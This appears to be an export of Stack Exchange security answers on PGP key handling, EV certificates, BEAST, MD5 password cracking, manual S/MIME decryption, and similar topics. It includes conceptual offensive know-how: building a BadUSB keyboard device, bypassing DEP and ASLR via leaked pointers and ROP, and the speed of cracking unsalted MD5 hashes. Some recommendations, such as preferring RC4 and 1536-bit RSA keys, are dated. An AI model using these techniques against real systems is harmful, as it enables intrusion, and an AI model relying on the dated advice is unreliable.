<p>I had a <a href=""https://superuser.com/a/541162/102155"">more detailed answer facing RSA with DSA/Elgamal</a> for another question at Superuser, go there for reading further.</p>

<h1>Key Expiration</h1>

<p>There are two ways a private key could get compromised:</p>

<ol>
<li>Somebody is able to steal it from you</li>
<li>Somebody is able to recalculate it from your public key</li>
</ol>

<p>First is a matter of your computer's security (and how you use your key, read below), second is a matter of time. Today (and probably the next few years), RSA 2k keys will be totally fine. But computing power rises dramatically, so an attacker needs less CPU cores/graphic cards/computers/power plants to recalculate your private key. Also, glitches could be found in the used algorithms, leading to much less computing power needed. Quantum computers could speed up things even more.</p>

<p>A <strong>key expiration date</strong> will limit the validity of your key to a given time you expect it to be secure. Any attacker cracking it afterwards will only be able to read encrypted data send to you, but nobody will use it any more; if an attacker gets hold of your key and you stay unnoticed, at least it will stop him from having use from it after a given time.</p>

<p><strong>Expiring your primary key</strong> will let you lose all your Web of Trust reputation, but at least invalidates your key after a given time if you lose access (what should never ever happen, read on at the end of my answer).</p>

<h1>Storing your Primary Key Offline</h1>

<p>Your primary key is the most crucial one. All trust - both incoming and outgoing - is connected with this. If somebody gets access to it, he's able to:</p>

<ul>
<li>Create new keys using your name (and GnuPG always uses your newest subkey by default!)</li>
<li>Revoking subkeys and primary keys</li>
<li>Issuing trust to other keys, which is the worst thing to happen: An attacker could create a new key, giving it trust from your old one and then revoke your old key, leaving you without any access to your ""moved"" identity - he's literally <strong>overtaking your identity</strong>.</li>
</ul>

<blockquote>
  <p>How important is it actually to keep the certification key offline when one uses a) a ""really"" strong passphrase [...]?</p>
</blockquote>

<p>Your computer always could be hacked or infected by some malware downloading your keys and installing a key logger to fetch your password (and this is not a matter of which operating system you use, all of them include severe security holes nobody knows about at this time).</p>

<p><strong>Keeping your primary (private) key offline is a good choice</strong> preventing these problems. It includes some hassles, but reduces risks as stated above.</p>

<p>Highest security would of course mean to use a separate, offline computer (hardware, no virtual machine!) to do all the key management using your primary key and only transferring OpenPGP data (foreign keys and signatures you issued) using some thumb drive.</p>

<blockquote>
  <p>b) a hardware device like an OpenPGP card?</p>
</blockquote>

<p>OpenPGP smart cards are somewhere in between storing it offline on a thumbdrive, but attaching it to your computer for signing and using another offline computer dedicated to this purpose. Your private key will never leave the smart card (except for backup purpose) which requires an ""admin PIN"", all signing and even key creation will happen inside the card. ""Using"" your key (encryption, signing, giving trust) will only require a ""user PIN"", so even if you connect the card to a ""harmed"" computer, the attacker will not be able to completely overtake your ID.</p>

<p>You can store your public key wherever you want, for having real use of OpenPGP, you even should send it (and your other public keys) to the keyservers.</p>

<hr>

<p>And do not forget to create and print a revocation certificate of your primary key. Losing your private key not having this certificate means there is a key you cannot access any more lingering on the keyservers and <strong>you can't do anything about it</strong>.</p>

<p>Print it, possibly several times, and put it to places you trust. Your parents, some bank deposit box, ... - if this certificate leaks, worst thing to happen is losing your Web of Trust.</p>
","31598"
"What are the advantages of EV Certificate?","16898","","<p>What are the various advantages of using <a href=""http://en.wikipedia.org/wiki/Extended_Validation_Certificate"">extended validation (EV) certificates</a> than normal certificates which also provide comparatively high degree of encryption like RC4, 128 Bit?</p>

<p>I know that the browser shows green flag for EV certs. But is there any other benefit than just that?</p>
","<p>Extended Validation certificates are intended to show the user more visibly the institution to which they were issued. The technical aspects of the certificates themselves is combined with visual clues in the user interface of the application verifying them: the green bar and a visible name next to the location bar in the browser.</p>

<p>For example, the EV certificate at <a href=""http://www.paypal.com/"" rel=""nofollow noreferrer"">http://www.paypal.com/</a> will make the browser show a green bar and display ""PayPal, Inc."" next to it. This is designed not only to link the certificate to the domain owner (like standard domain-validated certificates do), but also link it to a more physical institution (here, PayPal, Inc.). To do this, the CA must verify that the named institution is indeed the one owning the domain.</p>

<p>Ultimately, this is more about making a more authenticated link between the domain name and the company name than making ""more secure"" certificates. From a cipher suite point of view (which is what determines the encryption algorithm and key size), EV certificates are no different from DV certificates (blue bar).</p>

<p>Stepping back a little, you need to realise that the effectiveness of HTTPS relies on the user checking that it's used correctly. (The server has no way to find out whether the client is victim of a MITM attack otherwise, unless using client-certificates too.) This means that the users have to:</p>

<ul>
<li>check that HTTPS is used when they expect it to be,</li>
<li>check that there are no warnings,</li>
<li>check that the website they're using is indeed the one they're intending to visit, which leads to a couple of sub-points:

<ul>
<li>checking that it's the domain name they expect,</li>
<li>checking that the domain name belongs to the company they expect.</li>
</ul></li>
</ul>

<p>EV certificates are intended to solve that last sub-point. If you already know that <code>amazon.com</code> belongs to Amazon.com, Inc. or that <code>google.com</code> belongs to Google Inc., you don't really need them.</p>

<p>I'm not personally convinced that this approach completely works, since they can be misused (see NatWest/RBS example below) and some CAs seem to propagate vague (and potentially misleading) information as to what they really are, in an effort to promote them.</p>

<p>In general, if your users already know that your domain name is yours, you don't really need one.</p>

<p>Here are more details from a <a href=""https://security.stackexchange.com/a/13614/2435"">previous answer I gave to a similar question</a>:</p>

<blockquote>
  <p>[...]</p>
  
  <p>The domain-validated certificates guarantee you that the certificate
  was issued to the owner of that domain. No more, but no less (I'm
  assuming the validation procedure was correct here). In many cases,
  this is sufficient. It all depends on whether the website you are
  promoting needs to be linked to an institution that is already well
  known off-line. Certificates that are validated against an
  organisation (OV and EV certs) are mainly useful when you need to tie
  the domain to a physical organisation too.</p>
  
  <p>For example, it's useful for a institution that was initially known
  via its building (e.g. Bank of America) to be able to say that a
  certificate for <code>bankofamerica.com</code> is indeed for the place where you've
  given your physical money. In this case, it makes sense to use an OV
  or EV certificate. This can also be useful is there is ambiguity
  regarding which institution is behind the domain name (e.g. <code>apple.com</code>
  and <code>apple.co.uk</code>), which is even more important is the similar domain
  name is owned by a rival/attacker using the name similarity for bad
  purposes.</p>
  
  <p>In contrast, <a href=""https://www.google.com/"" rel=""nofollow noreferrer""><code>www.google.com</code></a> is what defines Google to the public;
  Google has no need to prove that <code>google.com</code> belongs to the real
  Google. As a result, it's using a domain-validated certificate (same
  for <code>amazon.com</code>).</p>
  
  <p>Again, this is really useful if the user knows how to check this.
  Browsers don't really help here. Firefox just says ""which is run by
  (unknown)"" if you want more details about the cert at <code>www.google.com</code>,
  without really saying what is meant by this.</p>
  
  <p>Extended-validation certificates are an attempt to improve this, by
  making the organisation-validation procedure more strict, and by
  making the result more visible: green bar and more visible
  organisation.</p>
  
  <p>Unfortunately, this is sometimes used in a way that increases
  confusion, I think. Here is an example that you can check by yourself:
  one of the large UK banks (NatWest) uses the <a href=""https://www.nwolb.com/"" rel=""nofollow noreferrer""><code>https://www.nwolb.com/</code></a>
  for its on-line banking services. It's far from obvious that the
  domain name belongs to NatWest (who also own the more logical
  <code>natwest.co.uk</code> name, by the way). Worse, the extended validation (if
  you check the name next to the green bar) is done against ""Royal Bank
  of Scotland Group plc"".</p>
  
  <p>For those who follow financial news, it makes sense because both RBS
  and NatWest belong to the same group, but technically, RBS and NatWest
  are competitors (and both have branches on the high street in the UK
  -- although that's going to change). If your user doesn't have that extra knowledge about which groups trade under which name, the fact
  that a certificate is issued to the name of a potential competitor
  should ring alarm bells. If, as a user, you saw a certificate on
  <code>gooooogle.com</code> issued to Microsoft or Yahoo, however green the bar is,
  you should not treat this as Google's site.</p>
  
  <p>One point to bear in mind with EV certificates is that <a href=""https://security.stackexchange.com/a/14064/2435"">their
  configuration is hard-coded into the browsers</a>. This is a compile-time
  setting, which cannot be configured later on (unlike normal trusted
  certificate stores, where you could add your own institutional CA
  cert, for example). From a more cynical point of view, some could
  consider this as a convenient way for the main players to keep a
  strong position in the market.</p>
</blockquote>
","15871"
"How to whitelist IP address mod_security CentOS 6","16867","","<p>Is it possible to white list an IP address in mod_security?</p>

<p>I found white ist whole domain name in mod_security. But I want to white list only the administrator IP. </p>

<p>OS: CentOS 6
Server: Apache httpd 2.15
Mod Security: Version 2.7</p>
","<p>Found the way.</p>

<pre><code>vim /etc/httpd/modsecurity.d/activated_rules/modsecurity_crs_10_whitelist.conf
</code></pre>

<p>And add this line:</p>

<pre><code>SecRule REMOTE_ADDR ""^192\.168\.50\.1$"" phase:1,log,allow,ctl:ruleEngine=Off,id:999945
</code></pre>
","61863"
"How can I reprogram a usb as a keyboard","16841","","<p>One of my recent posts has lead me to find that you can reprogram a usb drive to appear as a keyboard to a computer. I would like to know how to do this I am currently on a power google trying to find the answer I need (I know you can buy usb drives out there already but I want to make one!)</p>

<p>If i find any solutions I will answer this my self but maybe someone here can hasten the speed?</p>

<p>so to reiterate: How do I reprogram a USB drive to appear as a keyboard?</p>

<p>original question that this is based off:</p>

<p><a href=""https://security.stackexchange.com/questions/102873/how-can-usb-sticks-be-dangerous"">How can USB sticks be dangerous?</a></p>
","<p>Although that is possible, it's kinda hard to do that by yourself and it's for more advanced users. It requires lots of knowledge on low level programming and hardware.</p>

<p>The key point here is, reprogramming a USB flash drive's firmware to act as HDI (Human Interface Device). That is called a <code>bad USB</code>.</p>

<p>I found a tutorial called 
<a href=""http://null-byte.wonderhowto.com/how-to/make-your-own-bad-usb-0165419/"" rel=""noreferrer"">How to Make Your Own Bad USB</a>. The tutorial introduces you in more detail to what it is a <code>bad USB</code> and explains how to create one in Windows.<br>
But the exploit described in this tutorial <em>doesn't work on all</em> USB flash drives. It has some specific requirements.</p>

<p>From the tutorial intro:</p>

<blockquote>
  <p>Most common USB flash drives are exploitable due to the ""Bad USB
  vulnerability"". This allows us hackers to reprogram the
  microcontroller of them to act as a “Human Interface Device” (HID) /
  keyboard and perform custom keystrokes on our target machine. This
  scenario is often called “HID Payload Attack”, since you have to hand
  over your script to the Bad USB for the execution ( more on that later
  ). Even though almost every USB flash drive is exploitable, only a way
  to reprogram “Phison” microcontrollers has been released yet.</p>
</blockquote>

<p>I haven't tried the tutorial, so I can't tell you if it will work, but nothing as trying it by yourself :)</p>
","102935"
"Is there a way to mitigate BEAST without disabling AES completely?","16789","","<p>It seems that the easiest way to protect users against the BEAST attack on TLS &lt;= 1.0 is to prefer RC4 or even disable all other (CBC) cipher suites altogether, e.g. by specifying something like</p>

<pre><code>SSLCipherSuite RC4-SHA:HIGH:!ADH
</code></pre>

<p>in the Apache mod_ssl configuration.</p>

<p>However, the problem with CBC seems to have been fixed in TLS >= 1.1; is there any way to (re)enable these ciphers for clients claiming to support TLS 1.1 or 1.2? There seems to be a workaround:</p>

<pre><code>SSLCipherSuite ECDHE-RSA-AES128-SHA256:AES128-GCM-SHA256:RC4:HIGH:!MD5:!aNULL:!EDH
</code></pre>

<p>which does the trick by specifying cipher suites that are only available in TLS >= 1.1. That seems to have the side effect of preventing TLS >= 1.1 clients to use any of the ""older"" cipher suites.</p>

<p>Is there really no way to explicitly tell mod_ssl to use CBC mode ciphers for TLS >= 1.1, but only RC4 for SSL/TLS &lt;= 1.0? That would seem to be an optimal combination of security and compatibility.</p>
","<p>One way to mitigate BEAST is to <strong>do nothing</strong>. It so happens that though the vulnerability used in BEAST is still there, exploiting it is rather difficult. It requires the ability to do cross-domain requests, with a high level of control on the data which is sent in the request; in particular, it needs ""binary"" data. Duong and Rizzo did not find a way to map the attack on plain <code>&lt;img&gt;</code> tags (hostile Javascript which produces such tags, with an attacker-chosen path: the path gets in the request, but it is text-only). In their demonstration, they could use two cross-domain holes, one in a draft version of WebSockets, the other in the implementation of Java from Oracle. Both holes have since been fixed, therefore, right now, BEAST does not apply anymore (unless you did not update your browser for more than one year, in which case you probably have bigger problems).</p>

<p>Since relying on the non-existence of cross-domain vulnerabilities is, at best, flimsy, browser vendors have also included some extra countermeasures, with <strong>record splitting</strong>. When the browser wants to send a block of <em>n</em> bytes of data, instead of putting it in one SSL record, it splits it into <em>two</em> records, the first being very small. Record boundaries have no semantic significance in SSL/TLS, so you can do such splitting without changing the meaning. However, each record ends with a <a href=""http://en.wikipedia.org/wiki/Message_authentication_code"">MAC</a> computed over the record data <em>and a sequence number</em>, and using one key derived from the initial key exchange. This somehow acts as a pseudo-random number generator. Therefore, the small record ""emulates"" the random IV generation that makes TLS 1.1+ immune from BEAST.</p>

<p>Ideally, the split would be <em>0/n</em>: a record with no data (but still with a MAC), followed by a record with the actual data. Zero-length records are allowed (as per the <a href=""http://tools.ietf.org/html/rfc5246"">standard</a>) but buggy client and server implementations do not tolerate them (in particular IE 6.0); instead, browsers use a <em>1/n-1</em> split, which is just as good for defeating BEAST, but also works with almost all existing SSL/TLS clients and servers. At least Chrome and Firefox have pushed it <a href=""https://bugzilla.mozilla.org/show_bug.cgi?id=665814"">last year</a>.</p>

<p><strong>The good solution is TLS 1.1+</strong> but even on SSL 3.0 and TLS 1.0, the BEAST issue can be considered as fixed, at least in the Web context. Therefore, use AES, and be happy.</p>
","24489"
"How long will it take to crack the passwords stolen in the Yahoo hack announced 14 Dec 2016?","16769","","<p>Apparently Yahoo was hacked yet again <a href=""https://krebsonsecurity.com/2016/12/yahoo-one-billion-more-accounts-hacked/"" rel=""nofollow noreferrer"">with up to a billion user accounts</a> being compromised. The article says Yahoo uses MD5 for password hashing.   </p>

<p>Are the hackers likely to be able to crack the passwords too?
How long will it take to crack 1 password?
Is the time to crack 1 billion  , just 1B * t ?</p>
","<p>Yes, they were likely able to crack many of the passwords in a short time.</p>

<p>From the <a href=""https://yahoo.tumblr.com/post/154479236569/important-security-information-for-yahoo-users"" rel=""nofollow noreferrer"">official Yahoo statement</a>:</p>

<blockquote>
  <p>For potentially affected accounts, the stolen user account information may have included names, email addresses, telephone numbers, dates of birth, <strong>hashed passwords (using MD5)</strong> and, in some cases, encrypted or unencrypted security questions and answers.</p>
</blockquote>

<p>MD5 is a <a href=""https://stackoverflow.com/a/30502701/5765873"">disputable</a> <a href=""https://security.stackexchange.com/questions/19906/is-md5-considered-insecure"">choice</a> for password hashing because its speed makes cracking MD5-hashed passwords <a href=""https://security.stackexchange.com/a/8609/95381"">really fast</a>. Also, they are likely not salted, since Yahoo would have certainly let us know. (A salt would have helped to prevent the use of rainbow tables while cracking.)</p>

<p>You can see the drawbacks of simple MD5 hashing when you compare it with the Ashley Madison breach in 2015 which leaked 36 million accounts. In that case, they used <strong><a href=""https://en.wikipedia.org/wiki/Bcrypt"" rel=""nofollow noreferrer"">bcrypt</a></strong> with 2<sup>12</sup> key expansion rounds as opposed to Yahoo's plain MD5 which is why back then <a href=""http://arstechnica.com/security/2015/08/cracking-all-hacked-ashley-madison-passwords-could-take-a-lifetime/"" rel=""nofollow noreferrer"">researchers could only decipher 4,000 passwords</a> in a first attempt.</p>

<p>From the article:</p>

<blockquote>
  <p>In Pierce's case, bcrypt limited the speed of his four-GPU cracking rig to a paltry 156 guesses per second.
  [...]
  Unlike the extremely slow and computationally demanding bcrypt, MD5, SHA1, and a raft of other hashing algorithms were designed to place a minimum of strain on light-weight hardware. That's good for manufacturers of routers, say, and it's even better for crackers. <strong>Had Ashley Madison used MD5, for instance, Pierce's server could have completed 11 million<sup>1</sup> guesses per second</strong>, a speed that would have allowed him to test all 36 million password hashes in 3.7 years if they were salted and just three seconds if they were unsalted (many sites still do not salt hashes). </p>
</blockquote>

<p>So, cracking a large portion of the Yahoo passwords is a matter of seconds (while some stronger passwords will remain unbroken). An exact answer would depend on the available computation power and the password security awareness of Yahoo customers.</p>

<hr>

<p><sup>1</sup>As @grc has noted, 11 million hashes per second appears rather slow. @Morgoroth's linked <a href=""https://gist.github.com/epixoip/a83d38f412b4737e99bbef804a270c40"" rel=""nofollow noreferrer"">8x Nvidia GTX 1080 Hashcat benchmark</a> (200.3 GH/s for MD5 total) is a good resource for more up-to-date measurements.</p>
","145370"
"How does a server obtain the IP Address of a user?","16758","","<p>How does a server obtain the IP Address of a user? Is it possible to fool the server by spoofing the IP Address?</p>
","<p>When you send a request to the server, the server need to know where to answer, it's with your ip address. This is directly based on the TCP/IP protocol and in a lower level than web servers.</p>

<p>For the reason why Firebug doesn't show your IP address, it's like when you receive mail (paper), you have your address written in front, and the sender in the back. Firebugs shows you the content of the letter, not the sender and the receiver address (IP in IT).</p>
","16450"
"How ""leaking pointers"" to bypass DEP/ASLR works","16730","","<p>I was wondering if anyone could give me some clues on how ""leaking pointers"" to bypass DEP/ASLR work. I read <a href=""https://security.stackexchange.com/questions/18556/how-do-aslr-and-dep-work"">here</a>:</p>

<blockquote>
  <p>The only way to reliably bypass DEP and ASLR is through an pointer
  leak. This is a situation where a value on the stack, at a reliable
  location, might be used to locate a usable function pointer or ROP
  gadget. Once this is done, it is sometimes possible to create a
  payload that reliably bypasses both protection mechanisms.</p>
</blockquote>

<p>how this is accomplished is kind of a mystery to me. I have a buffer overflow.. so I can overwrite till EIP and stack contents.. I have a reliable function pointer or code pointer in the stack, and I know where this is stored.. also if I know this location.. how do I put this address in EIP? I can't control the execution stream if I can't change EIP to that reliable location</p>
","<p>""Leaky Pointers"" or more commonly known as ""Dangling Pointers"" is useful to create an attack chain to bypass a layered security system.</p>

<p>The idea behind DEP is that you are making regions of memory non-executable,  such that shellcode in this area cannot be executed.  DEP alone is really easy to bypass,  you can just ret-to-lib,  and call any function you would like,  <code>system()</code> is a favorite. </p>

<p>However,  under Windows, <a href=""http://en.wikipedia.org/wiki/Address_space_layout_randomization"">ASLR</a> enabled libraries will have a randomized memory space,  so the attacker won't know the memory address of the <code>system()</code> function,  and there for cannot call it.  The idea behind ASLR is that <strong>It doesn't matter if you can control the EIP if you don't know where to jump to.</strong></p>

<p>Being able to read the location of a region of randomized memory undermines the protection of ASLR,  because now you have a reliable jump location.  This can be accomplished though a wide verity of methods.  Using a buffer overflow to simply overwrite the null terminator and <strong>read</strong> past the end of an array has been used in pwn2own against IE.  But really the most common technique is using a <a href=""http://en.wikipedia.org/wiki/Dangling_pointer"">Dangling Pointer</a> which can be used to read/write or even execute a valid memory location despite ASLR.</p>

<p>Even with ASLR,  not every memory location is randomized.   In fact the executable binary has a predictable layout,  so you can use the executable against its self in a <a href=""http://en.wikipedia.org/wiki/Return-oriented_programming"">ROP Chain</a>.  However sometimes its difficult to find useful ROP gadgets, especially if the target binary is very small.  If you are unable to build a useful ROP Chain,  then a memory disclosure vulnerability,  such as a dangling pointer,  is a great method of attack.  Its important to note that ASLR only randomizes the location of the page (the first few bytes of the memory address),  if you can populate a region within this page with your shellcode then it maybe possible to accurately execute your shellcode by using the leaked memory address as a base and then hopefully your shellcode is at some offset of this random location.</p>

<p>Using chains of memory manipulation vulnerabilities is unusually only possible inside a scripting environment, such as JavaScript. </p>
","22992"
"SMIME email decryption key with OpenSSL","16716","","<p>I'd like to know if it's possible to use openssl command to retrieve and decrypt the key for encrypting/decryptig email content. I know I can decrypt the whole encrypted mail by something like this</p>

<pre><code>openssl smime -decrypt -in enc_mail.eml -inkey recip_priv.pem &gt; dec_mail.eml
</code></pre>

<p>However, I'd like to see the steps in between. If I understand the procedure right, the actual content of the email is being encrypted not by the recipient's pubkey, but with randomly generated key on sender's side. This key is then encrypted with recipient's pubkey and attached to the encrypted message. Am I right? Is it possible to use openssl to show me the attached encrypted key and decrypt it separately?</p>

<p>Thanks.</p>
","<p>Yes you can. 
This example uses <code>openssl smime</code> with the default RC2 CBC with a 40-bit key. The newer <a href=""https://security.stackexchange.com/questions/41399/openssl-pkcs7-vs-s-mime""><code>cms</code> sub-command behaves slightly differently</a>, and uses 3-DES by default. <em>You probably shouldn't be using either of those algorithms to encrypt important data</em> ;-)</p>

<p>There are two minor caveats: firstly, I'm also going to use a couple of other tools (though <em>OpenSSL</em> is used for all the heavy lifting), and secondly I'm going to make some assumptions about how the email was encrypted.</p>

<p>The en/decryption is along the lines of most RSA-using methods: use (slow, expensive) RSA to en/decrypt a symmetric key, and use the fast symmetric key to en/decrypt the real data. (See <a href=""https://security.stackexchange.com/questions/44702/whats-the-limit-on-the-size-of-the-data-that-public-key-cryptos-can-handle/44713#44713"">this question</a> or <a href=""https://security.stackexchange.com/questions/37581/why-does-pgp-use-symmetric-encryption-and-rsa"">this</a> for more background).</p>

<p>Take your email, extract the P7M part, and decode it. If you have a single <code>.p7m</code> part that is base64 encoded you can do this easily with <code>metamail</code>:</p>

<pre><code>$ metamail -wy enc_mail.eml
</code></pre>

<p>Save the P7M file. This is an <a href=""http://en.wikipedia.org/wiki/Asn.1"" rel=""nofollow noreferrer"">ASN.1</a> DER encoded <a href=""http://en.wikipedia.org/wiki/Cryptographic_Message_Syntax"" rel=""nofollow noreferrer"">CMS</a> (PKCS#7) file, so we can peek inside:</p>

<pre><code>  $ dumpasn1 -tilda  smime.p7m
   0 1946: SEQUENCE {
   4    9: . OBJECT IDENTIFIER envelopedData (1 2 840 113549 1 7 3)
         : . . (PKCS #7)
  15 1931: . [0] {
                  [ .. certificate details and whatnot omitted ...]
 188   13: . . . . . SEQUENCE {
 190    9: . . . . . . OBJECT IDENTIFIER rsaEncryption (1 2 840 113549 1 1 1)
         : . . . . . . . (PKCS #1)
 201    0: . . . . . . NULL
         : . . . . . . }
 203  256: . . . . . OCTET STRING    
         : . . . . . . A0 DA EA FB EA 1A 0F 81    ........
         : . . . . . . F4 30 9F 78 5C 9B A7 27    .0.x\..'
                       [ ... blob snipped ...]
 463 1483: . . . SEQUENCE {
 467    9: . . . . OBJECT IDENTIFIER data (1 2 840 113549 1 7 1)
         : . . . . . (PKCS #7)
 478   26: . . . . SEQUENCE {
 480    8: . . . . . OBJECT IDENTIFIER rc2CBC (1 2 840 113549 3 2)
         : . . . . . . (RSADSI encryptionAlgorithm)
 490   14: . . . . . SEQUENCE {
 492    2: . . . . . . INTEGER 160
 496    8: . . . . . . OCTET STRING 3E EA 0E 12 37 A8 56 70                 
         : . . . . . . }
         : . . . . . }
 506 1440: . . . . [0]    
         : . . . . . A5 FF A1 70 2C AD 82 6A    ...p,..j
         : . . . . . C7 F0 84 E8 9E 93 8F 53    .......S
                     [... blob snipped ...]
</code></pre>

<p>I'm using <a href=""http://www.cs.auckland.ac.nz/~pgut001/#standards"" rel=""nofollow noreferrer""><code>dumpasn1</code></a> because <code>openssl asn1parse</code> is disinclined to display or dump the various blobs we're interested in. The structure of your email will vary from the above of course. Columns 1 and 2 are the offset and size of each (possibly nested) sub-structure.</p>

<p>The interesting parts are at offsets:</p>

<ul>
<li><strong>188</strong> the RSA encryption details, followed at offset <strong>203</strong> by encrypted data</li>
<li><strong>463</strong> the S/MIME encryption details and parameters (RC2 CBC)</li>
<li><strong>506</strong> the encrypted blob</li>
</ul>

<p>At offset 188 we can see RSA is used, followed by 256 bytes of data, so extract that data blob (offset 203) and convert it to binary:</p>

<pre><code>$ dumpasn1 -a -203 smime.p7m | tail -qn +2 | xxd -r -p &gt; rsa.bin
</code></pre>

<p>(Note starting offset <code>-203</code> and the use of <code>tail</code> to skip over the first line of output. This is a little convoluted, but unfortunately both <code>dumpasn1</code> and <code>openssl asn1parse</code> leave the type-length prefix intact when you try to slice and dice objects.)</p>

<p>Decrypt this data using RSA:</p>

<pre><code>$ openssl rsautl -inkey recip_priv.pem -in rsa.bin -decrypt -out rc2key.bin
$ xxd -u -p  rc2key.bin
92F6EB53B1
</code></pre>

<p>In this case we get 5 bytes (40-bit) output, the symmetric key we need. The input was <a href=""http://tools.ietf.org/html/rfc2313"" rel=""nofollow noreferrer"">PKCS#1 v1.5</a> padded (see §8.1) for <a href=""https://security.stackexchange.com/questions/34999/rsa-possible-vulnerability/35000#35000"">various reasons</a>, hence the size disparity.</p>

<p>The main payload (email) is in the blob at offset 506, extract that to a file:</p>

<pre><code>$ dumpasn1 -a -506 smime.p7m | tail -qn +2 | xxd -r -p &gt; email.bin
</code></pre>

<p>Now here's the slightly tricky bit, for RC2 refer to section 6 of <a href=""http://tools.ietf.org/html/rfc2268"" rel=""nofollow noreferrer"">RFC 2268</a>:</p>

<pre><code>rc2CBC OBJECT IDENTIFIER
 ::= {iso(1) member-body(2) US(840) rsadsi(113549)
      encryptionAlgorithm(3) 2}

RC2-CBCParameter ::= CHOICE {
  iv IV,
  params SEQUENCE {
    version RC2Version,
    iv IV
  }
}

RC2Version ::= INTEGER -- 1-1024
IV ::= OCTET STRING -- 8 octets
</code></pre>

<p>This explains the data structure at offset 490:</p>

<pre><code> 480    8: . . . . . OBJECT IDENTIFIER rc2CBC (1 2 840 113549 3 2)
         : . . . . . . (RSADSI encryptionAlgorithm)
 490   14: . . . . . SEQUENCE {
 492    2: . . . . . . INTEGER 160
 496    8: . . . . . . OCTET STRING 3E EA 0E 12 37 A8 56 70                 
         : . . . . . . }
</code></pre>

<p>(You can confirm that RC2Version 160 (0xa0) matches key size 40 bit (0x28) in the EKB table.)</p>

<p>So, putting it all together: the S/MIME encryption algorithm (RC2 40 bit CBC, offset 480), the RC2 key (decrypted from blob at offset 203), the RC2 IV (not encrypted, offset 496) and the encrypted payload (offset 506):</p>

<pre><code>$ openssl enc -d -rc2-40-cbc -in email.bin -out email.txt -K 92F6EB53B1 -iv 3EEA0E1237A85670
</code></pre>

<p>and <code>email.txt</code> should be what you're looking for.</p>

<p>Tips:</p>

<ul>
<li>make sure not to use an ancient version of <code>xxd</code>, it may mangle input hex data</li>
<li>the structure, sizes and offsets will of course vary by message, keys and algorithm</li>
<li>I find <code>openssl enc -kfile ...</code> does not work, stick to <code>-K</code></li>
<li><code>openssl smime</code> <em>may</em> have modified your message before encryption (<a href=""http://rt.openssl.org/Ticket/Display.html?id=1817"" rel=""nofollow noreferrer"">CRLF</a> requirements)</li>
<li><a href=""https://github.com/hallgrimurhg/berdump"" rel=""nofollow noreferrer""><code>berdump</code></a> is a handy tool as its output is more amenable to further processing. Since DER is a subset of BER, you can point it directly at a PKCS#7 DER file</li>
</ul>
","45294"
"What SSL key should I make for IIS: RSA or DH? What bit length is appropriate?","16707","","<p>I'm creating an SSL cert for my IIS server and need to know when I should choose the <code>Microsoft RSA SChannel Cryptographic Provider</code> or the <code>Microsoft DH SChannel Cryptographic Provider</code>.</p>

<p><strong>Question 1</strong> Why would someone still need (what I assume is) a legacy certificate of 'DH'?</p>

<p>Given that the default is RSA/1024, I'm assuming that is the most secure choice, and the other one is for legacy reasons.  </p>

<p><strong>Question 2</strong> Is there any guide to determine what bit level is appropriate for x device?</p>

<p>I'd be interested in either lab results, a math formula, or your personal experience. I know the different bit levels influence the time needed to secure an SSL session and that is important for low powered devices.  </p>

<p><strong>Question 3</strong> How would bit-strength affect these scenarios?</p>

<p>My particular case involves these communication patterns:</p>

<ol>
<li><p>A website that has powerful clients connecting and disconnecting the session frequently</p></li>
<li><p>A WCF website that sustains long durations of high IO data transfers</p></li>
<li><p>A client facing website geared for iPhones, and Desktops</p></li>
</ol>
","<ol>
<li><p>RSA and Diffie-Hellman (DH) are just two different algorithms which accomplish a similar goal.  For most purposes, there is no overwhelming reason to prefer one algorithm over another (RSA vs Diffie-Hellman).  They do have somewhat different performance characteristics.  RSA is the standard choice, and it's a fine choice.</p></li>
<li><p>It's hard to give a one-size-fit-all recommendation on key size, because this is likely to be dependent upon your site's security needs, and because the key size affects performance.  My default recommendation would be to use a 1536-bit RSA key.  1024-bit RSA keys should be an absolute bare minimum; however, 1024-bit RSA keys are on the edge of what might become crackable in the near term and are generally not recommended for modern use, so if at all possible, I would recommend 1536- or 2048-bit RSA keys.</p>

<p>Note that many CAs have recently started deprecating 1024-bit end-entity certificates, as of December 31, 2010: they may issue you a cert for a 1024-bit RSA key, for legacy purposes, if you ask, but they are encouraging people to transition to 2048-bit RSA.  Some CAs are requiring 2048-bit keys, no exceptions.  Personally, I think 2048-bit RSA is overkill for most purposes and 1536-bit RSA is probably fine, but 2048-bit RSA is accumulating some inertia.</p></li>
<li><p>The larger the key, the slower initial connection establishment will be.  The most likely impact is on your server's load, since the server has to do a few public-key operations for each new device that connects to it (within a 24-hour period or so).  The public-key cryptography only incurs a one-time cost, which is paid once when a connection is created (and not paid again for any new connection within about 24 hours or so); the amount of data transferred over the connection is not relevant.</p></li>
</ol>

<p>So, my default suggestion would be: select a 1536-bit RSA key, then test on a typical-low end client (e.g., an iPhone) to make sure performance is OK, then test whether your server can handle the number of connections per day associated with that key size.  If you have performance problems on the server, consider a crypto accelerator to speed up your server's performance.  If you still have serious performance issues, you could consider dropping down to 1024-bit RSA.  If you have a security-critical site, like a banking site, use 2048-bit RSA.</p>
","2561"
"Why are iframes allowed at all in modern browsers?","16631","","<p>I read a number of IT security blogs (though I'm no security expert), and it seems a significant percentage of exploits in the wild are delivered through adding malicious iframes to a hacked website, with the iframe pointing to the malicious payload.</p>

<p>Given this, together with the fact that I have really seen almost no legitimate iframe applications that aren't obnoxious, why are they allowed at all in modern browsers? It seems to me that a easy way to block a significant number of the drive-by attacks would be to simply disable iframe support in the browser.</p>

<p>Alternatively, a ""click-to-load"" mechanism, similar to the ""click-to-flash"" plugins common for many browsers would have a similar effect, without completely preventing existing sites that use iframes from working.<br>
Alternatively, disallowing iframes that load content from another domain would probably be effective too.</p>

<hr>

<p>I certainly don't claim that blocking iframes would solve every web-security solution, but from a cost-benefit perspective, it seems a very easy way to blok a significant number of security issues.</p>
","<p>Given that framing is deprecated, and AJAX has origin control, iframes is pretty much the only way to embed another page into yours.</p>

<p>Another thing is that you can use iframes to display PDFs/etc. Sure, you can use <code>&lt;object&gt;</code> for that as well, but iframes are easier.</p>

<p>GMail is made from iframes. The smooth UX of GMail (you can still use it when your internet connection breaks, smooth navigation without having to reload every time) comes from iframes. Again, this could be implemented in AJAX, but it's harder.</p>

<p>One last thing that comes to mind is backwards compatibility. A lot of sites use iframes, and disabling it would break too many of them. Sure, click-to-enable won't cut it here, either. One of the precursors of AJAX was a trick with iframes and javascript. A lot of websites used to use that, and ""click to load"" will break the flow of the JS.</p>

<p>On the other hand, issues with iframes (CSRF, clickjacking, etc) are well known to modern developers and they can take measures to avoid that.</p>

<hr>

